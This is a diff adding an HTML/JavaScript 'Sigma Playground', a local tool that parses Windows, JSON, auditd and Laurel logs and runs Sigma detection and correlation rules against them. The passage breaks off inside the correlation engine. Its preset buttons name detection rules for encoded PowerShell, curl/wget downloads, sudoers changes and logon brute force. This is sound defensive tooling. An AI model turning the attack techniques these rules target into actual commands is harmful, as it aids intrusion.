@@ -1,0 +1,1792 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>SIGMA // PLAYGROUND</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&family=Syne:wght@700;800&display=swap" rel="stylesheet" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/js-yaml/4.1.0/js-yaml.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/json5/2.2.3/index.min.js"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:        #0e0e12;
+    --bg-1:      #181820;
+    --bg-2:      #23232c;
+    --bg-input:  #0b0b10;
+    --border:    #34343f;
+    --border-hi: #54545f;
+    --text:      #f2f2f4;
+    --text-dim:  #b4b5bf;
+    --text-faint:#878892;
+    --amber:     #ffb73d;
+    --amber-h:   #ffd27a;
+    --amber-d:   #d48200;
+    --amber-bg:  rgba(255,183,61,0.14);
+    --green:     #2ee89a;
+    --red:       #ff6681;
+    --cyan:      #7fe4ff;
+    --violet:    #c4b3ff;
+  }
+
+  html, body { height: 100%; background: var(--bg); color: var(--text); font-family: 'JetBrains Mono', ui-monospace, monospace; font-size: 12.5px; line-height: 1.5; overflow: hidden; }
+
+  body::before { content:''; position: fixed; inset: 0; background: repeating-linear-gradient(0deg, transparent 0, transparent 2px, rgba(255,255,255,0.012) 2px, rgba(255,255,255,0.012) 3px); pointer-events: none; z-index: 1000; }
+  body::after  { content:''; position: fixed; inset: 0; background: radial-gradient(ellipse at center, transparent 55%, rgba(0,0,0,0.55) 100%); pointer-events: none; z-index: 999; }
+
+  .app { height: 100vh; display: grid; grid-template-rows: auto 1fr auto; }
+
+  .topbar { display: flex; align-items: center; justify-content: space-between; padding: 14px 20px; border-bottom: 1px solid var(--border); background: var(--bg-1); }
+  .brand { display: flex; align-items: baseline; gap: 14px; }
+  .brand-mark { font-family: 'Syne', sans-serif; font-weight: 800; font-size: 22px; letter-spacing: -0.02em; color: var(--text); }
+  .brand-mark .slash { color: var(--amber); margin: 0 6px; }
+  .brand-sub { color: var(--text-faint); font-size: 10px; letter-spacing: 0.3em; text-transform: uppercase; }
+  .topbar-meta { display: flex; align-items: center; gap: 22px; font-size: 11px; letter-spacing: 0.15em; text-transform: uppercase; color: var(--text-dim); font-weight: 600; }
+  .dot { display: inline-block; width: 7px; height: 7px; background: var(--green); box-shadow: 0 0 8px var(--green); margin-right: 8px; vertical-align: middle; animation: pulse 2.4s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
+
+  .main { display: grid; grid-template-columns: 1fr 1fr; gap: 1px; background: var(--border); overflow: hidden; }
+  .col { display: flex; flex-direction: column; background: var(--bg); min-width: 0; }
+  .col.left { display: grid; grid-template-rows: 1fr 1fr; gap: 1px; background: var(--border); }
+
+  .panel { display: flex; flex-direction: column; background: var(--bg-1); min-height: 0; position: relative; }
+  .panel:focus-within { box-shadow: inset 0 0 0 1px var(--amber-d); }
+  .panel-head { display: flex; align-items: center; justify-content: space-between; padding: 10px 14px; border-bottom: 1px solid var(--border); background: var(--bg-2); gap: 10px; flex-wrap: wrap; }
+  .panel-title { display: flex; align-items: center; gap: 10px; font-size: 11px; letter-spacing: 0.28em; text-transform: uppercase; color: var(--text); font-weight: 700; white-space: nowrap; }
+  .panel-title .tick { color: var(--amber); }
+  .panel-tag { font-size: 10px; color: var(--text-dim); letter-spacing: 0.2em; text-transform: uppercase; font-weight: 500; }
+
+  /* tabs */
+  .tabs { display: flex; gap: 0; }
+  .tab {
+    background: transparent;
+    border: 0; border-bottom: 2px solid transparent;
+    padding: 8px 14px 10px;
+    font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700;
+    letter-spacing: 0.28em; text-transform: uppercase;
+    color: var(--text-dim); cursor: pointer;
+    transition: color 0.1s, border-color 0.1s;
+  }
+  .tab:hover { color: var(--text); }
+  .tab.active { color: var(--amber); border-bottom-color: var(--amber); }
+  .tab .badge-small { display: inline-block; margin-left: 8px; padding: 1px 6px; background: var(--bg-2); color: var(--text-faint); font-size: 9px; border: 1px solid var(--border); }
+  .tab.active .badge-small { background: var(--amber-bg); color: var(--amber); border-color: var(--amber-d); }
+
+  .editor-wrap { flex: 1; position: relative; overflow: hidden; background: var(--bg-input); }
+  textarea.editor { width: 100%; height: 100%; background: transparent; color: var(--text); border: 0; outline: 0; padding: 16px 18px; font-family: 'JetBrains Mono', monospace; font-size: 12.5px; line-height: 1.65; resize: none; caret-color: var(--amber); white-space: pre; tab-size: 2; transition: box-shadow 0.1s; }
+  textarea.editor::selection { background: var(--amber-bg); }
+  textarea.editor::placeholder { color: var(--text-faint); }
+  textarea.editor.drop-hover { box-shadow: inset 0 0 0 2px var(--amber); background: var(--amber-bg); }
+
+  .toolbar { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
+  .tb-btn, .tb-select { background: transparent; color: var(--text-dim); border: 1px solid var(--border); padding: 5px 9px; font-family: 'JetBrains Mono', monospace; font-size: 10px; letter-spacing: 0.2em; text-transform: uppercase; cursor: pointer; font-weight: 600; }
+  .tb-btn:hover, .tb-select:hover { color: var(--amber); border-color: var(--amber-d); }
+  .tb-select { appearance: none; background-image: linear-gradient(45deg, transparent 50%, var(--text-dim) 50%), linear-gradient(135deg, var(--text-dim) 50%, transparent 50%); background-position: calc(100% - 12px) 50%, calc(100% - 7px) 50%; background-size: 5px 5px, 5px 5px; background-repeat: no-repeat; padding-right: 24px; }
+  .tb-sep { width: 1px; height: 16px; background: var(--border); margin: 0 2px; }
+  .tb-btn.fileup { color: var(--amber); border-color: var(--amber-d); }
+  .tb-btn.fileup:hover { background: var(--amber-bg); }
+
+  .results { flex: 1; overflow-y: auto; padding: 18px; background: var(--bg-input); }
+  .results::-webkit-scrollbar { width: 8px; }
+  .results::-webkit-scrollbar-thumb { background: var(--border-hi); }
+
+  .tab-panel { display: none; flex: 1; overflow: hidden; flex-direction: column; }
+  .tab-panel.active { display: flex; }
+
+  .empty { height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--text-faint); text-align: center; gap: 14px; padding: 20px; }
+  .empty .ascii { font-size: 10px; line-height: 1.15; white-space: pre; color: var(--border-hi); }
+  .empty .msg { font-size: 11px; letter-spacing: 0.25em; text-transform: uppercase; color: var(--text-dim); }
+  .empty .hint { font-size: 11px; color: var(--text-faint); max-width: 380px; line-height: 1.65; }
+  .empty .hint kbd { background: var(--bg-2); border: 1px solid var(--border); padding: 1px 6px; font-family: 'JetBrains Mono'; font-size: 10px; color: var(--amber); }
+
+  .summary { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px; background: var(--border); margin-bottom: 18px; border: 1px solid var(--border); }
+  .summary > div { background: var(--bg-2); padding: 12px 14px; }
+  .stat-label { font-size: 10px; letter-spacing: 0.22em; text-transform: uppercase; color: var(--text-dim); margin-bottom: 6px; font-weight: 600; }
+  .stat-val { font-family: 'Syne', sans-serif; font-weight: 800; font-size: 22px; color: var(--text); }
+  .stat-val.amber { color: var(--amber); }
+  .stat-val.violet { color: var(--violet); }
+
+  .event-row { border: 1px solid var(--border); margin-bottom: 10px; background: var(--bg-1); }
+  .event-row.hit { border-color: var(--amber-d); box-shadow: inset 3px 0 0 var(--amber); }
+  .event-row.miss { opacity: 0.55; }
+  .event-head { display: flex; justify-content: space-between; align-items: center; padding: 10px 14px; border-bottom: 1px solid var(--border); background: var(--bg-2); cursor: pointer; user-select: none; gap: 10px; }
+  .event-head:hover { background: #1d1d22; }
+  .event-title { font-size: 11px; letter-spacing: 0.18em; text-transform: uppercase; display: flex; gap: 12px; align-items: center; min-width: 0; }
+  .event-title .ellip { color: var(--text-dim); font-size: 11px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 260px; }
+  .badge { display: inline-block; padding: 3px 8px; font-size: 9.5px; letter-spacing: 0.25em; text-transform: uppercase; font-weight: 700; }
+  .badge.hit { background: var(--amber); color: #1a0e00; }
+  .badge.miss { background: transparent; color: var(--text-faint); border: 1px solid var(--border-hi); }
+  .badge.corr { background: var(--violet); color: #1a0c33; }
+  .event-body { padding: 10px 14px; display: none; }
+  .event-row.open .event-body { display: block; }
+  .event-body .kv { display: grid; grid-template-columns: 220px 1fr; gap: 4px 14px; font-size: 11.5px; }
+  .event-body .k { color: var(--text-dim); word-break: break-all; font-weight: 500; }
+  .event-body .v { color: var(--text); word-break: break-all; }
+  .event-body .v.match { color: var(--amber); background: rgba(255,183,61,0.15); padding: 1px 5px; font-weight: 600; }
+
+  .error-box { border: 1px solid var(--red); background: rgba(255,68,102,0.06); padding: 14px 16px; color: var(--red); font-size: 11.5px; }
+  .error-box strong { display: block; font-size: 10px; letter-spacing: 0.28em; text-transform: uppercase; margin-bottom: 6px; font-weight: 700; }
+
+  /* TRANSLATE tab */
+  .translate-head {
+    padding: 14px 18px 6px;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 0.1em;
+  }
+  .translate-head b { color: var(--text); }
+  .translate-head .meta { color: var(--text-faint); font-size: 10px; letter-spacing: 0.2em; text-transform: uppercase; margin-top: 4px; }
+
+  .backend-card {
+    border: 1px solid var(--border);
+    background: var(--bg-1);
+    margin: 0 18px 14px;
+  }
+  .backend-head {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 9px 12px;
+    background: var(--bg-2);
+    border-bottom: 1px solid var(--border);
+  }
+  .backend-name {
+    font-size: 10.5px;
+    font-weight: 700;
+    letter-spacing: 0.28em;
+    text-transform: uppercase;
+    color: var(--text);
+  }
+  .backend-name .sigil { color: var(--amber); margin-right: 8px; }
+  .backend-name .fmt { color: var(--text-faint); font-weight: 500; margin-left: 6px; font-size: 9.5px; }
+  .backend-copy {
+    background: transparent;
+    color: var(--text-dim);
+    border: 1px solid var(--border-hi);
+    padding: 4px 10px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 9.5px; letter-spacing: 0.22em; text-transform: uppercase;
+    cursor: pointer; font-weight: 600;
+  }
+  .backend-copy:hover { color: var(--amber); border-color: var(--amber-d); }
+  .backend-copy.copied { color: var(--green); border-color: var(--green); }
+  .backend-query {
+    padding: 12px 14px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    line-height: 1.6;
+    color: var(--cyan);
+    background: var(--bg-input);
+    white-space: pre-wrap;
+    word-break: break-word;
+    max-height: 320px;
+    overflow-y: auto;
+  }
+  .backend-query::-webkit-scrollbar { width: 6px; height: 6px; }
+  .backend-query::-webkit-scrollbar-thumb { background: var(--border-hi); }
+  .backend-notes {
+    padding: 8px 14px;
+    border-top: 1px dashed var(--border);
+    background: var(--bg-1);
+    font-size: 10.5px;
+    color: var(--text-dim);
+    letter-spacing: 0.08em;
+    line-height: 1.6;
+  }
+  .backend-notes b { color: var(--amber); }
+  .backend-query.error {
+    color: var(--red);
+    background: rgba(255,68,102,0.05);
+  }
+
+  .footer { display: flex; align-items: stretch; border-top: 1px solid var(--border); background: var(--bg-1); }
+  .foot-info { flex: 1; padding: 10px 20px; font-size: 11px; letter-spacing: 0.18em; text-transform: uppercase; color: var(--text-dim); display: flex; align-items: center; gap: 22px; flex-wrap: wrap; font-weight: 600; }
+  .foot-info span.sep { color: var(--text-faint); }
+  .execute-btn { background: var(--amber); color: #1a0e00; border: 0; padding: 0 40px; font-family: 'JetBrains Mono', monospace; font-weight: 800; font-size: 13px; letter-spacing: 0.28em; text-transform: uppercase; cursor: pointer; transition: background 0.12s; min-width: 240px; }
+  .execute-btn:hover { background: var(--amber-h); }
+  .execute-btn:active { background: var(--amber-d); }
+
+  .cond { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--cyan); background: rgba(102,224,255,0.06); padding: 2px 6px; border: 1px solid rgba(102,224,255,0.2); }
+  .corr-chip { display: inline-block; padding: 2px 8px; font-size: 9.5px; letter-spacing: 0.25em; text-transform: uppercase; font-weight: 700; background: rgba(179,157,255,0.1); color: var(--violet); border: 1px solid rgba(179,157,255,0.3); margin-left: 6px; }
+
+  .file-info { color: var(--text-dim); font-size: 10px; letter-spacing: 0.2em; text-transform: uppercase; }
+  .file-info b { color: var(--amber); font-weight: 600; }
+
+  .group-row {
+    border: 1px solid var(--border);
+    margin-bottom: 10px;
+    background: var(--bg-1);
+  }
+  .group-row.hit { border-color: var(--violet); box-shadow: inset 3px 0 0 var(--violet); }
+  .group-row.miss { opacity: 0.55; }
+  .group-head {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 10px 14px; background: var(--bg-2); cursor: pointer; gap: 10px;
+  }
+  .group-head:hover { background: #1d1d22; }
+  .group-key {
+    font-size: 11px; letter-spacing: 0.1em;
+    display: flex; align-items: center; gap: 12px;
+  }
+  .group-count {
+    font-family: 'Syne', sans-serif; font-weight: 800; font-size: 15px;
+  }
+  .group-count.ok { color: var(--violet); }
+  .group-count.no { color: var(--text-faint); }
+  .group-body { padding: 10px 14px; display: none; border-top: 1px solid var(--border); }
+  .group-row.open .group-body { display: block; }
+  .group-body .sub { font-size: 11.5px; color: var(--text-dim); margin-bottom: 6px; letter-spacing: 0.05em; }
+  .group-body ul { list-style: none; padding: 0; }
+  .group-body li { padding: 4px 0; font-size: 11.5px; color: var(--text); border-bottom: 1px dashed var(--border); }
+</style>
+</head>
+<body>
+<div class="app">
+
+  <header class="topbar">
+    <div class="brand">
+      <div class="brand-mark">SIGMA<span class="slash">//</span>PLAYGROUND</div>
+      <div class="brand-sub">v0.3 · multi-format · correlation · backends</div>
+    </div>
+    <div class="topbar-meta">
+      <div><span class="dot"></span>ENGINE READY</div>
+      <div id="meta-events">EVENTS: 0</div>
+      <div id="meta-rule">RULE: —</div>
+    </div>
+  </header>
+
+  <main class="main">
+
+    <div class="col left">
+
+      <section class="panel">
+        <div class="panel-head">
+          <div class="panel-title"><span class="tick">▸</span> SIGMA RULE <span class="panel-tag">/ yaml · v2</span></div>
+          <div class="toolbar">
+            <button class="tb-btn fileup" id="btn-upload-rule">↥ FILE</button>
+            <input type="file" id="file-rule" hidden accept=".yml,.yaml,.sigma,.txt" />
+            <div class="tb-sep"></div>
+            <button class="tb-btn" data-rule="rule1">PS_ENC</button>
+            <button class="tb-btn" data-rule="rule2">NEW_SVC</button>
+            <button class="tb-btn" data-rule="rule3">CURL/WGET</button>
+            <button class="tb-btn" data-rule="rule4">SUDOERS</button>
+            <button class="tb-btn" data-rule="rule5">⟳ CORR·COUNT</button>
+            <button class="tb-btn" data-rule="rule6">⟳ CORR·TEMPORAL</button>
+            <button class="tb-btn" id="btn-clear-rule">CLR</button>
+          </div>
+        </div>
+        <div class="editor-wrap">
+          <textarea id="rule" class="editor" spellcheck="false"></textarea>
+        </div>
+      </section>
+
+      <section class="panel">
+        <div class="panel-head">
+          <div class="panel-title"><span class="tick">▸</span> TEST DATA <span class="panel-tag" id="format-tag">/ auto</span></div>
+          <div class="toolbar">
+            <select class="tb-select" id="data-format" title="Format">
+              <option value="auto">AUTO</option>
+              <option value="xml">XML</option>
+              <option value="json">JSON</option>
+              <option value="ndjson">NDJSON</option>
+              <option value="json5">JSON5</option>
+              <option value="auditd">AUDITD</option>
+              <option value="laurel">LAUREL</option>
+            </select>
+            <button class="tb-btn fileup" id="btn-upload-data">↥ FILE</button>
+            <input type="file" id="file-data" hidden multiple />
+            <div class="tb-sep"></div>
+            <button class="tb-btn" data-data="data1">WIN · PS</button>
+            <button class="tb-btn" data-data="data2">WIN · SVC</button>
+            <button class="tb-btn" data-data="data3">AUDITD</button>
+            <button class="tb-btn" data-data="data4">LAUREL</button>
+            <button class="tb-btn" data-data="data5">JSON</button>
+            <button class="tb-btn" data-data="data6">BRUTE4625</button>
+            <button class="tb-btn" id="btn-clear-data">CLR</button>
+          </div>
+        </div>
+        <div class="editor-wrap">
+          <textarea id="data" class="editor" spellcheck="false" placeholder="Drop files or paste XML / JSON / NDJSON / JSON5 / auditd / Laurel..."></textarea>
+        </div>
+      </section>
+
+    </div>
+
+    <section class="panel col right">
+      <div class="panel-head">
+        <div class="tabs">
+          <button class="tab active" data-tab="analysis">ANALYSIS</button>
+          <button class="tab" data-tab="translate">TRANSLATE<span class="badge-small" id="tab-badge">5</span></button>
+        </div>
+        <div class="panel-tag" id="rt-time">—</div>
+      </div>
+
+      <div class="tab-panel active" id="panel-analysis">
+        <div class="results" id="results">
+          <div class="empty">
+            <div class="ascii">
+   ┌─────────────────────────┐
+   │   [ ] [ ] [ ]           │
+   │   ▒▒▒▒▒▒▒▒▒▒▒▒          │
+   │   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒      │
+   │   ▒▒▒▒▒▒▒▒▒▒            │
+   └─────────────────────────┘
+            </div>
+            <div class="msg">awaiting input</div>
+            <div class="hint">
+              Regel + Daten laden, dann <kbd>Ctrl</kbd>+<kbd>↵</kbd> oder <b style="color:var(--amber)">EXECUTE</b>.
+              Tab <b style="color:var(--amber)">TRANSLATE</b> zeigt die Regel als Query in allen Backends.
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="tab-panel" id="panel-translate">
+        <div class="results" id="translate-out">
+          <div class="empty">
+            <div class="msg">load a rule</div>
+            <div class="hint">
+              Sobald eine valide Sigma-Regel im Editor steht, erscheinen hier die Queries für Elastic (Lucene), Splunk SPL, Sentinel KQL, Cortex XSIAM (XQL) und Logpoint — korrelationsfähig.
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </section>
+
+  </main>
+
+  <footer class="footer">
+    <div class="foot-info">
+      <div>LOCAL MODE</div><span class="sep">│</span>
+      <div id="foot-file" class="file-info">NO FILE LOADED</div><span class="sep">│</span>
+      <div id="foot-stat">IDLE</div>
+    </div>
+    <button id="execute" class="execute-btn">EXECUTE SIGMA ▶</button>
+  </footer>
+
+</div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════
+   SIGMA PLAYGROUND ENGINE  v0.3
+   - multi-format parsers (xml/json/ndjson/json5/auditd/laurel)
+   - sigma v2 correlation support
+   - 5 backend converters
+   ═══════════════════════════════════════════════════════════ */
+
+/* ═════════ FLATTEN ═════════ */
+function flatten(obj, prefix, out) {
+  prefix = prefix || ''; out = out || {};
+  if (obj === null || obj === undefined) return out;
+  if (Array.isArray(obj)) {
+    out[prefix] = obj.map(v => (v && typeof v === 'object') ? JSON.stringify(v) : String(v)).join(' ');
+    obj.forEach((v, i) => {
+      if (v && typeof v === 'object') flatten(v, prefix + '[' + i + ']', out);
+      else out[prefix + '[' + i + ']'] = v;
+    });
+    if (obj.length && obj.every(v => v && typeof v === 'object' && !Array.isArray(v))) {
+      const agg = {};
+      for (const item of obj) for (const [k, v] of Object.entries(item)) {
+        if (v === null || typeof v === 'object') continue;
+        (agg[k] = agg[k] || []).push(String(v));
+      }
+      for (const [k, vals] of Object.entries(agg)) {
+        const key = prefix + '.' + k;
+        if (!(key in out)) out[key] = vals.join(' ');
+      }
+    }
+    return out;
+  }
+  if (typeof obj !== 'object') { out[prefix] = obj; return out; }
+  for (const [k, v] of Object.entries(obj)) {
+    const key = prefix ? prefix + '.' + k : k;
+    if (v !== null && typeof v === 'object') flatten(v, key, out);
+    else out[key] = v;
+  }
+  return out;
+}
+
+/* ═════════ PARSERS ═════════ */
+function parseXML(text) {
+  const doc = new DOMParser().parseFromString(text, 'text/xml');
+  const perr = doc.getElementsByTagName('parsererror');
+  if (perr.length) throw new Error('XML: ' + perr[0].textContent.split('\n')[0]);
+  const events = doc.getElementsByTagName('Event');
+  const out = [];
+  for (const ev of events) {
+    const flat = {};
+    const sys = ev.getElementsByTagName('System')[0];
+    if (sys) for (const c of sys.children) {
+      flat[c.tagName] = c.textContent.trim();
+      for (const a of c.attributes) flat[c.tagName + '.' + a.name] = a.value;
+    }
+    const ed = ev.getElementsByTagName('EventData')[0];
+    if (ed) for (const d of ed.getElementsByTagName('Data')) {
+      const n = d.getAttribute('Name');
+      if (n) flat[n] = d.textContent.trim();
+    }
+    for (const c of ev.children) {
+      if (c.tagName === 'System' || c.tagName === 'EventData') continue;
+      if (c.children.length === 0) flat[c.tagName] = c.textContent.trim();
+    }
+    out.push(flat);
+  }
+  return out;
+}
+function parseJSON(text) { const o = JSON.parse(text); return (Array.isArray(o) ? o : [o]).map(e => flatten(e)); }
+function parseNDJSON(text) {
+  const out = [];
+  text.split(/\r?\n/).forEach((line, idx) => {
+    const t = line.trim();
+    if (!t || t.startsWith('#') || t.startsWith('//')) return;
+    try { out.push(flatten(JSON.parse(t))); }
+    catch(e) { throw new Error('NDJSON line ' + (idx+1) + ': ' + e.message); }
+  });
+  return out;
+}
+function parseJSON5(text) { if (typeof JSON5 === 'undefined') throw new Error('JSON5 lib not loaded'); const o = JSON5.parse(text); return (Array.isArray(o) ? o : [o]).map(e => flatten(e)); }
+
+function parseAuditd(text) {
+  const reHead = /^(?:node=\S+\s+)?type=(\S+)\s+msg=audit\(([\d.]+):(\d+)\):\s*(.*)$/;
+  const reKV = /(\w+)=(?:"([^"]*)"|'([^']*)'|(\S+))/g;
+  const groups = new Map();
+  for (const raw of text.split(/\r?\n/)) {
+    const line = raw.trim();
+    if (!line || line.startsWith('#')) continue;
+    const m = line.match(reHead);
+    if (!m) continue;
+    const [, type, ts, serial, rest] = m;
+    const key = ts + ':' + serial;
+    let ev = groups.get(key);
+    if (!ev) { ev = { _id: key, _timestamp: Number(ts), _serial: serial, _types: [], type }; groups.set(key, ev); }
+    ev._types.push(type);
+    let km; reKV.lastIndex = 0;
+    while ((km = reKV.exec(rest))) {
+      const k = km[1];
+      const v = km[2] !== undefined ? km[2] : km[3] !== undefined ? km[3] : km[4];
+      ev[type + '.' + k] = v;
+      if (!(k in ev)) ev[k] = v;
+    }
+  }
+  return Array.from(groups.values());
+}
+function parseLaurel(text) {
+  const events = parseNDJSON(text);
+  const alias = ['exe','comm','uid','euid','gid','egid','pid','ppid','key','tty','success','exit','auid','syscall','arch'];
+  return events.map(e => {
+    for (const a of alias) { const src = 'SYSCALL.' + a; if (src in e && !(a in e)) e[a] = e[src]; }
+    if (!e.type) {
+      if ('SYSCALL.syscall' in e || 'SYSCALL.exe' in e) e.type = 'SYSCALL';
+      else if ('USER_ACCT.uid' in e) e.type = 'USER_ACCT';
+    }
+    return e;
+  });
+}
+function parseEvents(text, format) {
+  if (!text || !text.trim()) return [];
+  const f = format === 'auto' ? detectFormat(text) : format;
+  switch (f) {
+    case 'xml': return parseXML(text);
+    case 'json': return parseJSON(text);
+    case 'ndjson': return parseNDJSON(text);
+    case 'json5': return parseJSON5(text);
+    case 'auditd': return parseAuditd(text);
+    case 'laurel': return parseLaurel(text);
+    default: throw new Error('Unknown format: ' + f);
+  }
+}
+function detectFormat(text) {
+  const t = text.trim();
+  if (!t) return 'json';
+  const head = t.slice(0, 2048);
+  if (head.startsWith('<')) return 'xml';
+  if (/^type=\S+\s+msg=audit\(/m.test(head)) return 'auditd';
+  if (head.startsWith('[')) return 'json';
+  if (head.startsWith('{')) {
+    const lines = t.split(/\r?\n/).filter(l => l.trim());
+    if (lines.length > 1 && lines.slice(0,3).every(l => l.trim().startsWith('{'))) {
+      if (/"SYSCALL"\s*:\s*\{/.test(head) || /"EXECVE"\s*:\s*\{/.test(head)) return 'laurel';
+      return 'ndjson';
+    }
+    return 'json';
+  }
+  return 'json5';
+}
+
+/* ═════════ SIGMA MATCH ═════════ */
+function getField(event, path) { return (path in event) ? event[path] : undefined; }
+
+function matchField(actual, expected, mods) {
+  if (actual === undefined || actual === null) return { ok: false, hit: null };
+  const a = String(actual);
+  const vals = Array.isArray(expected) ? expected : [expected];
+  const useAll = mods.includes('all');
+  const ci = !mods.includes('cased');
+  const check = v => {
+    const vs = String(v);
+    const A = ci ? a.toLowerCase() : a;
+    const V = ci ? vs.toLowerCase() : vs;
+    if (mods.includes('contains'))   return A.includes(V);
+    if (mods.includes('startswith')) return A.startsWith(V);
+    if (mods.includes('endswith'))   return A.endsWith(V);
+    if (mods.includes('re'))         { try { return new RegExp(vs).test(a); } catch(e){ return false; } }
+    if (mods.includes('gt'))         return Number(a) > Number(vs);
+    if (mods.includes('lt'))         return Number(a) < Number(vs);
+    if (mods.includes('gte'))        return Number(a) >= Number(vs);
+    if (mods.includes('lte'))        return Number(a) <= Number(vs);
+    return A === V;
+  };
+  const hits = vals.filter(check);
+  const ok = useAll ? hits.length === vals.length : hits.length > 0;
+  return { ok, hit: ok ? hits[0] : null };
+}
+
+function matchSelection(event, sel) {
+  if (Array.isArray(sel)) {
+    for (const s of sel) { const r = matchSelection(event, s); if (r.ok) return r; }
+    return { ok: false, matches: [] };
+  }
+  const matches = [];
+  for (const [full, expected] of Object.entries(sel)) {
+    const parts = full.split('|');
+    const field = parts[0];
+    const mods = parts.slice(1);
+    const actual = getField(event, field);
+    const r = matchField(actual, expected, mods);
+    if (!r.ok) return { ok: false, matches: [] };
+    matches.push({ field, expected: r.hit, modifiers: mods, actual });
+  }
+  return { ok: true, matches };
+}
+
+function evalCondition(condition, sel) {
+  const keys = Object.keys(sel);
+  let e = ' ' + condition + ' ';
+  e = e.replace(/\ball of them\b/gi, '(' + keys.join(' and ') + ')');
+  e = e.replace(/\b1 of them\b/gi,   '(' + keys.join(' or ')  + ')');
+  e = e.replace(/\bany of them\b/gi, '(' + keys.join(' or ')  + ')');
+  e = e.replace(/\ball of ([a-zA-Z_][\w]*)\*/g, (_,p) => { const k = keys.filter(x => x.startsWith(p)); return k.length ? '(' + k.join(' and ') + ')' : 'false'; });
+  e = e.replace(/\b1 of ([a-zA-Z_][\w]*)\*/g, (_,p) => { const k = keys.filter(x => x.startsWith(p)); return k.length ? '(' + k.join(' or ') + ')' : 'false'; });
+  for (const k of keys) {
+    const re = new RegExp('\\b' + k.replace(/[.*+?^${}()|[\]\\]/g,'\\$&') + '\\b', 'g');
+    e = e.replace(re, sel[k].ok ? 'true' : 'false');
+  }
+  e = e.replace(/\band\b/gi, '&&').replace(/\bor\b/gi, '||').replace(/\bnot\b/gi, '!');
+  if (!/^[\s()!&|truefals]*$/i.test(e.replace(/true|false/gi,''))) throw new Error('Unsupported condition: ' + condition);
+  try { return Function('"use strict";return (' + e + ')')(); }
+  catch(err) { throw new Error('Condition eval failed: ' + condition); }
+}
+
+function runDetection(rule, events) {
+  const det = rule.detection;
+  if (!det) throw new Error('Rule "' + (rule.title||'') + '" has no detection');
+  const cond = det.condition;
+  if (!cond) throw new Error('Rule "' + (rule.title||'') + '" has no condition');
+  return events.map((ev, idx) => {
+    const s = {};
+    for (const [k, v] of Object.entries(det)) {
+      if (k === 'condition' || k === 'timeframe') continue;
+      s[k] = matchSelection(ev, v);
+    }
+    const hit = evalCondition(cond, s);
+    return { idx, event: ev, selResults: s, hit };
+  });
+}
+
+/* ═════════ RULE GRAPH ═════════
+   Parses multi-doc YAML. Classifies each document:
+   - correlation rule  → has `correlation:` block
+   - detection rule    → has `detection:` block
+   Correlations reference detection rules by `name` or `id`.
+*/
+function parseRuleGraph(yamlText) {
+  let docs;
+  try { docs = jsyaml.loadAll(yamlText).filter(d => d && typeof d === 'object'); }
+  catch (e) { throw new Error('YAML parse: ' + e.message); }
+  if (!docs.length) throw new Error('No rule documents found');
+
+  const detections = [];
+  const correlations = [];
+  const byName = {};
+  for (const d of docs) {
+    if (d.correlation) correlations.push(d);
+    else if (d.detection) {
+      detections.push(d);
+      if (d.name) byName[d.name] = d;
+      if (d.id)   byName[d.id]   = d;
+    }
+  }
+  return { docs, detections, correlations, byName };
+}
+
+/* ═════════ TIMESPAN PARSER ═════════ */
+function parseTimespan(ts) {
+  if (ts === undefined || ts === null) return null;
+  if (typeof ts === 'number') return ts * 1000; // assume seconds
+  const m = String(ts).match(/^(\d+)\s*(s|m|h|d)?$/i);
+  if (!m) return null;
+  const n = parseInt(m[1], 10);
+  const u = (m[2] || 's').toLowerCase();
+  const mult = { s: 1000, m: 60000, h: 3600000, d: 86400000 }[u];
+  return n * mult;
+}
+
+/* ═════════ EVENT TIMESTAMP ═════════ */
+const TIME_FIELDS = ['@timestamp','timestamp','TimeCreated.SystemTime','TimeCreated','time','eventTime','_timestamp','ts','date','SYSCALL.timestamp','ID'];
+function eventTime(ev, idx) {
+  if (ev._timestamp) return ev._timestamp * (ev._timestamp < 1e12 ? 1000 : 1);
+  for (const f of TIME_FIELDS) {
+    if (ev[f] !== undefined) {
+      const v = ev[f];
+      const n = Date.parse(v);
+      if (!isNaN(n)) return n;
+      const num = Number(v);
+      if (!isNaN(num)) return num * (num < 1e12 ? 1000 : 1);
+    }
+  }
+  // Laurel IDs look like "1729689600.123:987" – take the float
+  if (ev.ID && /^[\d.]+:\d+$/.test(String(ev.ID))) {
+    return parseFloat(String(ev.ID).split(':')[0]) * 1000;
+  }
+  return idx; // fallback: insertion order
+}
+
+/* ═════════ CORRELATION ENGINE ═════════ */
+function checkCorrCondition(count, cond) {
+  if (!cond || typeof cond !== 'object') return false;
+  if ('gte' in cond) return count >= cond.gte;
+  if ('gt'  in cond) return count >  cond.gt;
+  if ('lte' in cond) return count <= cond.lte;
+  if ('lt'  in cond) return count <  cond.lt;
+  if ('eq'  in cond) return count === cond.eq;
+  return false;
+}
+
+function runCorrelation(corrRule, graph, events) {
+  const c = corrRule.correlation;
+  const type = c.type || 'event_count';
+  const refs = (c.rules || []).map(n => {
+    const r = graph.byName[n];
+    if (!r) throw new Error('Correlation refs unknown rule: ' + n);
+    return r;
+  });
+  if (!refs.length) throw new Error('Correlation has no referenced rules');
+
+  const timespan = parseTimespan(c.timespan);
